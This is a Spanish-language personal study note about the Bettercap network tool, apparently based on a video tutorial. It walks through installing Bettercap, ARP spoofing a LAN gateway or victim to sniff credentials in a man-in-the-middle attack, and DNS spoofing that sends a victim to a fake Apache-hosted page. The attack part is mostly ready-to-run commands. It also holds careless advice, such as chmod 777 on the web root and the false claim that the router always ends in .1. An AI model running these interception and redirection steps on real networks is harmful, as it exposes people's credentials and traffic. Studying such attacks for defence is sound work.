---
title: Bettercap
area: ciberseguridad
tipo: herramienta
tags: [ciberseguridad, red-team, explotacion]
created: 2026-09-20
updated: 2026-10-12
related: ["[[MOC-ciberseguridad]]", "[[red-team-killchain]]", "[[Nmap]]", "[[Metasploit]]"]
---

Framework de ataque y monitoreo de redes. Funciona como “control de tráfico” en LAN: detecta dispositivos, intercepta paquetes, engaña protocolos y modifica tráfico en tiempo real. Es la evolución de Ettercap.

https://youtu.be/ER9S6sI-QLI?si=awUu7zjauqa2Igut

# Ataques con Bettercap

**Fuente:** Canal del Pingüino de Mario  
**Herramienta:** Bettercap

---

# Ataque de Sniffing

### Pasos
## 1 instalacion 
para instalar bettercap en kali linux lo hacemos de la siguiente manera :

```bash 
sudo apt install bettercap

o 
## si queremos elejir una interfaz de red

sudo bettercap -iface eth0 #3 obiamente esto es un ejemplo

```

## 2 iniciamos la herramientas 

``` bash 
sudo bettercap
```

## 3 iniciamos el escaneo en la red local 

``` bash
net.probe on 
```

![[Assets/bettercap-netprobe.png]]


si queremos algo mas visual usamos el siguiente comando :
``` bash
ticker on
```
se veria de la siguiente manera 

![[Assets/bettercap-ticker.png]]

## 4 identificar la puerta de enlace:
para este ataque debemos primero identificar la puerta de enlace o la gateway (router)

cuando lo identifiquemos ejecutamos lo siguiente 

``` bash
set arp.spoof targets 192.168.0.1 ##router siempre termina en .1

## para actiar el ataque hacemos lo siguiente 

arp.spoof on
```

esto con el fin de hacer un ataque man in the middle y poder ver todas la credenciales que se envian por la red 

despues de eso :

``` bash 
set net.sniff.verbose false
## y despues 
net.sniff on
## para acticvarlo 
```

con esto veremos lo datos que se envian por la red , esto tambien es posible con wireshark pero tambien se puede de esta manera 

# Ataque de DNS spoofing /envenamiento DNS


##  1 servidor web

para hacer este ataque podemos montar un servidor web con apache2 para redirigir a la victima a nuestro servidor web , lo hacemos de la siguiente manera:

``` bash
# instalamos apache2 

sudo apt install apache2

## creamos la pagina falsa 

cd /var/www/html
nano index.html
## encendemos 
sudo systemctl start apache2 

## verificamos que este encendido con 
sudo systemctl status apache2


## le damos permisos 

chmod 777 /var/www/html/
touch /var/www/html/

```

## 2 atacamos a la maquina 

una vez ya identificada la maquina que sera la victima , usamos el siguiente comando 
``` bash
set arp.spoof targets ip_victima
## iniciamos con 
arp.spoof on

## despues de eso

set dns.spoof.domains * 

o

set dns.spoof.domains ubuntu.com ## ubuntu.com es un ejemplo pero se puede usar cualquier 
 

set dns.spoof.address 192.168.1.5 # Tu IP de Kali 
dns.spoof on
```

## Ver también

- [[MOC-ciberseguridad]]
- [[red-team-killchain]]
- [[Nmap]]
- [[Metasploit]]
